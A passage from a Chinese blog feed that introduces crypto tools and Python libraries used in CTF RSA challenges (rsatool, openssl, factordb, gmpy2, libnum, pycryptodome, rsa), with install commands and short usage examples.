        <content type="html"><![CDATA[<p>本文介绍了在CTF比赛中密码学中常用的工具及python库：简要讲解了安装方法，常用的使用方法。</p><a id="more"></a><h2 id="RSA常用工具"><a href="#RSA常用工具" class="headerlink" title="RSA常用工具"></a>RSA常用工具</h2><h3 id="RSAtool"><a href="#RSAtool" class="headerlink" title="RSAtool"></a>RSAtool</h3><ul><li>任意给定两个素数（p，q）或者（模数n，私钥d）都可以计算出RSA（p,q,n,d,e）及RSA-CRT (dP, dQ, qInv) </li><li>返回参数可以以pem或der文件格式保存私钥文件</li></ul><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul><li>git clone <a href="https://github.com/ius/rsatool.git" target="_blank" rel="noopener">https://github.com/ius/rsatool.git</a></li><li>cd rsatool</li></ul><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ul><li><p>根据p，q生成私钥文件key.pem</p><p>  <code>python rsatool.py -f PEM -o key.pem -n 13826123222358393307 -d 9793706120266356337</code></p>  <pre>Using (n, d) to initialise RSA instancen = 13826123222358393307 (0xbfe041d1197381db)e = 65537 (0x10001)d = 9793706120266356337 (0x87ea3bd3bd0b9671)p = 4184799299 (0xf96ef843)q = 3303891593 (0xc4ed6289)Saving PEM as key.pem</pre></li><li><p>提供（p,q）生成key.der</p><p>  <code>python rsatool.py -f DER -o key.der -p 4184799299 -q 3303891593</code></p>  <pre>Using (p, q) to initialise RSA instancen = 13826123222358393307 (0xbfe041d1197381db)e = 65537 (0x10001)d = 9793706120266356337 (0x87ea3bd3bd0b9671)p = 4184799299 (0xf96ef843)q = 3303891593 (0xc4ed6289)Saving DER as key.der</pre></li></ul><h3 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h3><p>openssl可以查看公钥得到n和e，也可以利用私钥文件解密公钥加密的内容</p><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><ul><li>kail中自带</li><li>windows下可安装：OpenSSL-Win32</li></ul><h4 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h4><ul><li><p>查看公钥文件</p><p>  <code>openssl rsa -pubin -in pubkey.pem -text -modulus</code></p></li><li><p>解密</p><p>  <code>rsautl -decrypt -inkey private.pem -in flag.enc -out flag</code></p></li></ul><h3 id="整数分解工具"><a href="#整数分解工具" class="headerlink" title="整数分解工具"></a>整数分解工具</h3><h4 id="网站分解：http-factordb-com"><a href="#网站分解：http-factordb-com" class="headerlink" title="网站分解：http://factordb.com/"></a>网站分解：<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a></h4><h4 id="命令行分解：factordb-pycli，借用-factordb-数据库：https-github-com-ryosan-470-factordb-python"><a href="#命令行分解：factordb-pycli，借用-factordb-数据库：https-github-com-ryosan-470-factordb-python" class="headerlink" title="命令行分解：factordb-pycli，借用 factordb 数据库：https://github.com/ryosan-470/factordb-python"></a>命令行分解：factordb-pycli，借用 factordb 数据库：<a href="https://github.com/ryosan-470/factordb-python" target="_blank" rel="noopener">https://github.com/ryosan-470/factordb-python</a></h4><h5 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h5><pre><code>FactorDB存储了已经知道的整数的分解，这个工具可以在命令行上使用，对python2和python3也适用</code></pre><ul><li><p>本地对应pip安装即可：</p><p>  <code>pip3 install factordb-python</code></p></li><li><p>更新factordb-python</p><p>  <code>pip3 install --upgrade factordb-python</code></p></li></ul><h5 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h5><ul><li><p>命令行使用</p><p>  <code>C:\Users\fishmouse&gt;factordb 16</code></p>  <pre>2 2 2 2</pre></li><li><p>获得更多信息：</p><p>  <code>C:\Users\fishmouse&gt;factordb --json 16</code></p>  <pre>{"id": "http://factordb.com/api/?id=2", "status": "FF", "factors": [2, 2, 2, 2]}</pre></li><li><p>FacotrDB库的使用</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line">f = FactorDB(<span class="number">16</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.get_factor_list()</span><br></pre></td></tr></table></figure><pre><code>[]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.connect()</span><br></pre></td></tr></table></figure><pre><code>&lt;Response [200]&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.get_factor_list()</span><br></pre></td></tr></table></figure><pre><code>[2, 2, 2, 2]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.get_factor_from_api()</span><br></pre></td></tr></table></figure><pre><code>[[&apos;2&apos;, 4]]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.get_status()</span><br></pre></td></tr></table></figure><pre><code>&apos;FF&apos;</code></pre><h4 id="yafu本地分解"><a href="#yafu本地分解" class="headerlink" title="yafu本地分解"></a>yafu本地分解</h4><h5 id="windows下使用"><a href="#windows下使用" class="headerlink" title="windows下使用"></a>windows下使用</h5><p> <code>xxx\yafu-1.34&gt; .\yafu-x64.exe</code></p><p> <code>factor(21)</code></p><h2 id="RSA常用python库"><a href="#RSA常用python库" class="headerlink" title="RSA常用python库"></a>RSA常用python库</h2><h3 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h3><h4 id="windows下安装"><a href="#windows下安装" class="headerlink" title="windows下安装"></a>windows下安装</h4><ul><li><p>whl文件形式安装,下载对应python版本的whl文件：<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a></p><p><code>pip3 install gmpy2-2.0.8-cp37-cp37m-win_amd64.whl</code></p></li></ul><h4 id="kail中安装"><a href="#kail中安装" class="headerlink" title="kail中安装"></a>kail中安装</h4><p>安装gmpy2这个库还需要一些相应的环境mpfr和mpc</p><ul><li><p>首先安装mpfr，因为要安装mpc必须先安装mpfr</p><p>  <code>root@kali:~# wget https://www.mpfr.org/mpfr-current/mpfr-4.1.0.tar.bz2</code></p><p>  若失败到官网：<a href="https://www.mpfr.org/mpfr-current查看最新" target="_blank" rel="noopener">https://www.mpfr.org/mpfr-current查看最新</a></p><p>  <code>root@kali:~# tar -jxvf mpfr-4.1.0.tar.bz2</code></p><p>  <code>root@kali:~# cd mpfr-4.1.0</code></p><p>  <code>root@kali:~/mpfr-4.1.0# ./configure</code></p><p>  <code>root@kali:~/mpfr-4.1.0# make &amp;&amp; make check &amp;&amp; make install</code></p></li><li><p>安装mpc</p><p>  <code>root@kali:~# wget ftp://ftp.gnu.org/gnu/mpc/mpc-1.1.0.tar.gz</code></p><p>  <code>root@kali:~# tar -zxvf mpc-1.1.0.tar.gz &amp;&amp; cd mpc-1.1.0</code></p><p>  <code>root@kali:~/mpc-1.1.0# ./configure</code></p><p>  <code>root@kali:~/mpc-1.1.0# make &amp;&amp; make check &amp;&amp; make install</code></p></li><li><p>安装gmpy2</p><p>  <code>root@kali:~# pip3 install gmpy2</code></p></li></ul><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="gmpy2-gcd最大公约数"><a href="#gmpy2-gcd最大公约数" class="headerlink" title="gmpy2.gcd最大公约数"></a>gmpy2.gcd最大公约数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.gcd(<span class="number">2</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure><pre><code>mpz(2)</code></pre><h5 id="gmpy2-invert求逆元"><a href="#gmpy2-invert求逆元" class="headerlink" title="gmpy2.invert求逆元"></a>gmpy2.invert求逆元</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.invert(<span class="number">5</span>,<span class="number">26</span>)</span><br></pre></td></tr></table></figure><pre><code>mpz(21)</code></pre><h5 id="gmpy2-gcdext求逆元"><a href="#gmpy2-gcdext求逆元" class="headerlink" title="gmpy2.gcdext求逆元"></a>gmpy2.gcdext求逆元</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.gcdext(<span class="number">5</span>,<span class="number">26</span>)<span class="comment">#传入（a,b）;返回最大公约数、x、y  :g= ax+by</span></span><br></pre></td></tr></table></figure><pre><code>(mpz(1), mpz(-5), mpz(1))</code></pre><h5 id="gmpy2-iroot开次方根"><a href="#gmpy2-iroot开次方根" class="headerlink" title="gmpy2.iroot开次方根"></a>gmpy2.iroot开次方根</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.iroot(<span class="number">4</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><pre><code>(mpz(2), True)</code></pre><h3 id="libnum"><a href="#libnum" class="headerlink" title="libnum"></a>libnum</h3><h4 id="pip安装"><a href="#pip安装" class="headerlink" title="pip安装"></a>pip安装</h4><p><code>pip3 install libnum</code></p><h4 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="libnum-gcd求最大公约数"><a href="#libnum-gcd求最大公约数" class="headerlink" title="libnum.gcd求最大公约数"></a>libnum.gcd求最大公约数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">libnum.gcd(<span class="number">2</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure><pre><code>2</code></pre><h5 id="libnum-invmod求逆元"><a href="#libnum-invmod求逆元" class="headerlink" title="libnum.invmod求逆元"></a>libnum.invmod求逆元</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libnum.invmod(<span class="number">5</span>,<span class="number">26</span>)</span><br></pre></td></tr></table></figure><pre><code>21</code></pre><h5 id="libnum-xgcd扩展欧几里得"><a href="#libnum-xgcd扩展欧几里得" class="headerlink" title="libnum.xgcd扩展欧几里得"></a>libnum.xgcd扩展欧几里得</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libnum.xgcd(<span class="number">5</span>,<span class="number">26</span>)<span class="comment"># xgcd(a,b)返回：x,y,g ；ax+by=g</span></span><br></pre></td></tr></table></figure><pre><code>(-5, 1, 1)</code></pre><h5 id="libnum-s2n字符串转为整数"><a href="#libnum-s2n字符串转为整数" class="headerlink" title="libnum.s2n字符串转为整数"></a>libnum.s2n字符串转为整数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libnum.s2n(<span class="string">"hell0"</span>)</span><br></pre></td></tr></table></figure><pre><code>448378203184</code></pre><h5 id="libnum-n2s整数转换为字符串"><a href="#libnum-n2s整数转换为字符串" class="headerlink" title="libnum.n2s整数转换为字符串"></a>libnum.n2s整数转换为字符串</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libnum.n2s(<span class="number">448378203184</span>)</span><br></pre></td></tr></table></figure><pre><code>&apos;hell0&apos;</code></pre><h3 id="pycryptodome"><a href="#pycryptodome" class="headerlink" title="pycryptodome"></a>pycryptodome</h3><h4 id="pip安装-1"><a href="#pip安装-1" class="headerlink" title="pip安装"></a>pip安装</h4><p><code>pip3 install pycryptodome</code></p><p>安装后，可以使用<strong>Crypto</strong>这个模块，注意点：在对应python下的库Lib\site-packages中crypto开头为小写时，将其改为<strong>Crypto</strong>即可</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h3 id="整数到字符串（字节串的相互转换）"><a href="#整数到字符串（字节串的相互转换）" class="headerlink" title="整数到字符串（字节串的相互转换）"></a>整数到字符串（字节串的相互转换）</h3><h4 id="整数和字符串"><a href="#整数和字符串" class="headerlink" title="整数和字符串"></a>整数和字符串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串到整数</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">libnum.s2n(<span class="string">"hello"</span>)</span><br></pre></td></tr></table></figure><pre><code>448378203247</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 整数到字符串</span></span><br><span class="line">libnum.n2s(<span class="number">448378203247</span>)</span><br></pre></td></tr></table></figure><pre><code>&apos;hello&apos;</code></pre><h4 id="整数和字节串"><a href="#整数和字节串" class="headerlink" title="整数和字节串"></a>整数和字节串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字节串到整数</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line">bytes_to_long(<span class="string">'hello'</span>.encode())</span><br></pre></td></tr></table></figure><pre><code>448378203247</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 整数到字节串</span></span><br><span class="line">long_to_bytes(<span class="number">448378203247</span>)</span><br></pre></td></tr></table></figure><pre><code>b&apos;hello&apos;</code></pre><h3 id="素数产生"><a href="#素数产生" class="headerlink" title="素数产生"></a>素数产生</h3><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测大整数是否是素数,如果是素数,就返回True,否则返回False</span></span><br><span class="line"><span class="comment"># miller_rabin算法</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_miller</span><span class="params">(num)</span>:</span></span><br><span class="line">    s = num - <span class="number">1</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> s % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s = s // <span class="number">2</span></span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> trials <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        a = random.randrange(<span class="number">2</span>, num - <span class="number">1</span>)</span><br><span class="line">        v = pow(a, s, num)</span><br><span class="line">        <span class="keyword">if</span> v != <span class="number">1</span>:</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> v != (num - <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> i == t - <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i = i + <span class="number">1</span></span><br><span class="line">                    v = (v ** <span class="number">2</span>) % num</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_prime</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="comment"># 排除0,1和负数</span></span><br><span class="line">    <span class="keyword">if</span> num &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建小素数的列表,可以大幅加快速度</span></span><br><span class="line">    <span class="comment"># 如果是小素数,那么直接返回true</span></span><br><span class="line">    small_primes = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">107</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">163</span>, <span class="number">167</span>, <span class="number">173</span>, <span class="number">179</span>, <span class="number">181</span>, <span class="number">191</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">199</span>, <span class="number">211</span>, <span class="number">223</span>, <span class="number">227</span>, <span class="number">229</span>, <span class="number">233</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">251</span>, <span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>, <span class="number">379</span>, <span class="number">383</span>, <span class="number">389</span>, <span class="number">397</span>, <span class="number">401</span>, <span class="number">409</span>, <span class="number">419</span>, <span class="number">421</span>, <span class="number">431</span>, <span class="number">433</span>, <span class="number">439</span>, <span class="number">443</span>, <span class="number">449</span>, <span class="number">457</span>, <span class="number">461</span>, <span class="number">463</span>, <span class="number">467</span>, <span class="number">479</span>, <span class="number">487</span>, <span class="number">491</span>, <span class="number">499</span>, <span class="number">503</span>, <span class="number">509</span>, <span class="number">521</span>, <span class="number">523</span>, <span class="number">541</span>, <span class="number">547</span>, <span class="number">557</span>, <span class="number">563</span>, <span class="number">569</span>, <span class="number">571</span>, <span class="number">577</span>, <span class="number">587</span>, <span class="number">593</span>, <span class="number">599</span>, <span class="number">601</span>, <span class="number">607</span>, <span class="number">613</span>, <span class="number">617</span>, <span class="number">619</span>, <span class="number">631</span>, <span class="number">641</span>, <span class="number">643</span>, <span class="number">647</span>, <span class="number">653</span>, <span class="number">659</span>, <span class="number">661</span>, <span class="number">673</span>, <span class="number">677</span>, <span class="number">683</span>, <span class="number">691</span>, <span class="number">701</span>, <span class="number">709</span>, <span class="number">719</span>, <span class="number">727</span>, <span class="number">733</span>, <span class="number">739</span>, <span class="number">743</span>, <span class="number">751</span>, <span class="number">757</span>, <span class="number">761</span>, <span class="number">769</span>, <span class="number">773</span>, <span class="number">787</span>, <span class="number">797</span>, <span class="number">809</span>, <span class="number">811</span>, <span class="number">821</span>, <span class="number">823</span>, <span class="number">827</span>, <span class="number">829</span>, <span class="number">839</span>, <span class="number">853</span>, <span class="number">857</span>, <span class="number">859</span>, <span class="number">863</span>, <span class="number">877</span>, <span class="number">881</span>, <span class="number">883</span>, <span class="number">887</span>, <span class="number">907</span>, <span class="number">911</span>, <span class="number">919</span>, <span class="number">929</span>, <span class="number">937</span>, <span class="number">941</span>, <span class="number">947</span>, <span class="number">953</span>, <span class="number">967</span>, <span class="number">971</span>, <span class="number">977</span>, <span class="number">983</span>, <span class="number">991</span>, <span class="number">997</span>]</span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">in</span> small_primes:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果大数是这些小素数的倍数,那么就是合数,返回false</span></span><br><span class="line">    <span class="keyword">for</span> prime <span class="keyword">in</span> small_primes:</span><br><span class="line">        <span class="keyword">if</span> num % prime == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果这样没有分辨出来,就一定是大整数,那么就调用rabin算法</span></span><br><span class="line">    <span class="keyword">return</span> rabin_miller(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到大整数,默认位数为1024</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span><span class="params">(key_size=<span class="number">1024</span>)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        num = random.randrange(<span class="number">2</span>**(key_size<span class="number">-1</span>), <span class="number">2</span>**key_size)</span><br><span class="line">        <span class="keyword">if</span> is_prime(num):</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">print(get_prime(<span class="number">50</span>))</span><br></pre></td></tr></table></figure><pre><code>602912217591119</code></pre><h4 id="libnum-1"><a href="#libnum-1" class="headerlink" title="libnum"></a>libnum</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">libnum.generate_prime(<span class="number">30</span>)</span><br></pre></td></tr></table></figure><pre><code>936552131</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libnum.generate_prime_from_string(<span class="string">"abc"</span>)</span><br></pre></td></tr></table></figure><pre><code>418262526581</code></pre><h4 id="Crypto-Util-number"><a href="#Crypto-Util-number" class="headerlink" title="Crypto.Util.number"></a>Crypto.Util.number</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line">getPrime(<span class="number">30</span>)</span><br></pre></td></tr></table></figure><pre><code>930767861</code></pre><h3 id="rsa库简单使用"><a href="#rsa库简单使用" class="headerlink" title="rsa库简单使用"></a>rsa库简单使用</h3><h4 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line">(pubkey, privkey) = rsa.newkeys(<span class="number">128</span>)</span><br><span class="line">pubkey,privkey</span><br></pre></td></tr></table></figure><pre><code>(PublicKey(210654150686773160921155565886246123127, 65537), PrivateKey(210654150686773160921155565886246123127, 65537, 45430608142070156598272456648718438625, 245259021963773848463, 858904797874827929))</code></pre><h4 id="rsa加密"><a href="#rsa加密" class="headerlink" title="rsa加密"></a>rsa加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">"hello"</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">rsa.encrypt(m,pubkey)</span><br></pre></td></tr></table></figure><pre><code>b&apos;]\xd6\xb2w\xc4\x89[\xfcu`\x0b&amp;\xa0\xc9`\xd2&apos;</code></pre><h4 id="rsa解密"><a href="#rsa解密" class="headerlink" title="rsa解密"></a>rsa解密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsa.decrypt(<span class="string">b']\xd6\xb2w\xc4\x89[\xfcu`\x0b&amp;\xa0\xc9`\xd2'</span>,privkey)</span><br></pre></td></tr></table></figure><pre><code>b&apos;hello&apos;</code></pre><h3 id="公钥文件查看方式"><a href="#公钥文件查看方式" class="headerlink" title="公钥文件查看方式"></a>公钥文件查看方式</h3><h4 id="openssl-1"><a href="#openssl-1" class="headerlink" title="openssl"></a>openssl</h4><p><code>openssl rsa -pubin -in pubkey.pem -text -modulus</code></p><h4 id="rsa库"><a href="#rsa库" class="headerlink" title="rsa库"></a>rsa库</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'publickey.pem'</span>,mode=<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    keydata= f.read()</span><br><span class="line">pubckey = rsa.PublicKey.load_pkcs1_openssl_pem(keydata)</span><br><span class="line">pubckey.n</span><br><span class="line">pubckey.e</span><br></pre></td></tr></table></figure><h3 id="私钥文件生成方式"><a href="#私钥文件生成方式" class="headerlink" title="私钥文件生成方式"></a>私钥文件生成方式</h3><h4 id="rsatool-py"><a href="#rsatool-py" class="headerlink" title="rsatool.py"></a>rsatool.py</h4><p><code>python rsatool.py -f PEM -o prvkey.pem -p 4184799299 -q 3303891593</code></p><h4 id="from-Crypto-PublicKey-import-RSA"><a href="#from-Crypto-PublicKey-import-RSA" class="headerlink" title="from Crypto.PublicKey import RSA"></a>from Crypto.PublicKey import RSA</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">rsa_components=(n,e,int(d),p,q)</span><br><span class="line"></span><br><span class="line">keypair=RSA.construct(rsa_components)</span><br><span class="line"></span><br><span class="line">private = open(<span class="string">'private.pem'</span>, <span class="string">'wb'</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><h3 id="根据私钥文件读取公钥加密后密文方式"><a href="#根据私钥文件读取公钥加密后密文方式" class="headerlink" title="根据私钥文件读取公钥加密后密文方式"></a>根据私钥文件读取公钥加密后密文方式</h3><h4 id="利用rsa库直接读"><a href="#利用rsa库直接读" class="headerlink" title="利用rsa库直接读"></a>利用rsa库直接读</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line">prikey = rsa.PrivateKey(n , e , d , p , q)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"test.enc"</span> , <span class="string">"rb"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    print(rsa.decrypt(fp.read(), prikey).decode())</span><br></pre></td></tr></table></figure><h4 id="利用openssl"><a href="#利用openssl" class="headerlink" title="利用openssl"></a>利用openssl</h4><p><code>OpenSSL&gt; rsautl -decrypt -in test.enc -inkey private.pem</code></p><h3 id="字符串异或"><a href="#字符串异或" class="headerlink" title="字符串异或"></a>字符串异或</h3><h4 id="Crypto-Util-import-strxor"><a href="#Crypto-Util-import-strxor" class="headerlink" title="Crypto.Util import strxor"></a>Crypto.Util import strxor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util import strxor</span><br><span class="line">strxor(b&quot;hhh&quot;,b&quot;aaa&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 密码学 </tag>
            
            <tag> Crypto-CTF </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【吴恩达机器学习】线性SVM-01</title>
      <link href="2020/07/14/ML-006%E7%BA%BF%E6%80%A7SVM-1/"/>
      <url>2020/07/14/ML-006%E7%BA%BF%E6%80%A7SVM-1/</url>
      
